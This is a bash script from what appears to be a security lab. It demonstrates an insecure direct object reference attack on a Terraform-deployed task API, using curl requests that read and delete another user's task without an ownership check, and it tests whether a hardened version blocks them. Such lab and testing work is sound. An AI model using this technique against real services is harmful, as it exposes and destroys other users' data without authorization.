#!/usr/bin/env bash
#
# 03-idor.sh
# Attack 3: Insecure Direct Object Reference (IDOR)
#
# Demonstrates that any caller can read and delete a task belonging to
# another user, just by knowing its taskId. On the hardened version the
# same requests should be rejected with 403 Forbidden once the caller's
# userId does not match the task owner.
#
# Usage:
#   ./03-idor.sh [vulnerable|hardened]
#
# Optional environment variable:
#   ATTACKER_TOKEN   Bearer token to send as the attacker's identity.
#                     Leave unset to simulate a fully anonymous attacker.

set -uo pipefail

VERSION="${1:-vulnerable}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TF_DIR="${SCRIPT_DIR}/../../infra/terraform/${VERSION}"

if [ ! -d "$TF_DIR" ]; then
    echo "Error: Terraform directory not found: $TF_DIR"
    exit 1
fi

API=$(terraform -chdir="$TF_DIR" output -raw api_endpoint 2>/dev/null)

if [ -z "$API" ]; then
    echo "Error: could not read api_endpoint from Terraform output."
    echo "Make sure the '$VERSION' version has been deployed in $TF_DIR"
    exit 1
fi

AUTH_HEADER=()
if [ -n "${ATTACKER_TOKEN:-}" ]; then
    AUTH_HEADER=(-H "Authorization: Bearer ${ATTACKER_TOKEN}")
fi

echo "============================================================"
echo "Attack 3: IDOR"
echo "Target version : $VERSION"
echo "API endpoint   : $API"
echo "============================================================"
echo

echo "[1/3] Creating a task as the victim (userId=victim-001)..."
curl -s -X POST "$API/tasks" \
    -H "Content-Type: application/json" \
    -d '{"title":"Victim private task","userId":"victim-001","description":"Only victim-001 should access this"}' \
    -o /tmp/idor_victim.json
cat /tmp/idor_victim.json
echo
echo

if command -v jq >/dev/null 2>&1; then
    TASK_ID=$(jq -r '.task.taskId' /tmp/idor_victim.json)
else
    TASK_ID=$(grep -o '"taskId": *"[^"]*"' /tmp/idor_victim.json | head -1 | sed 's/.*"\([^"]*\)"$/\1/')
fi

if [ -z "$TASK_ID" ] || [ "$TASK_ID" = "null" ]; then
    echo "Could not extract taskId from the creation response, stopping here."
    exit 1
fi

echo "Victim task ID: $TASK_ID"
echo

echo "[2/3] Attacker reads the victim's task without proving ownership..."
READ_STATUS=$(curl -s -o /tmp/idor_read.json -w "%{http_code}" "${AUTH_HEADER[@]}" "$API/tasks/${TASK_ID}")
echo "HTTP status: $READ_STATUS"
cat /tmp/idor_read.json
echo
echo

echo "[3/3] Attacker deletes the victim's task without proving ownership..."
DELETE_STATUS=$(curl -s -o /tmp/idor_delete.json -w "%{http_code}" -X DELETE "${AUTH_HEADER[@]}" "$API/tasks/${TASK_ID}")
echo "HTTP status: $DELETE_STATUS"
cat /tmp/idor_delete.json
echo
echo

if [ "$READ_STATUS" = "200" ] && [ "$DELETE_STATUS" = "200" ]; then
    echo "RESULT: VULNERABLE"
    echo "The attacker read and deleted a task belonging to victim-001"
    echo "with no ownership check of any kind."
elif [ "$READ_STATUS" = "403" ] || [ "$DELETE_STATUS" = "403" ]; then
    echo "RESULT: BLOCKED"
    echo "The ownership check rejected at least one of the two attempts."
else
    echo "RESULT: UNEXPECTED"
    echo "Read status: $READ_STATUS, Delete status: $DELETE_STATUS"
    echo "Review the responses above."
fi
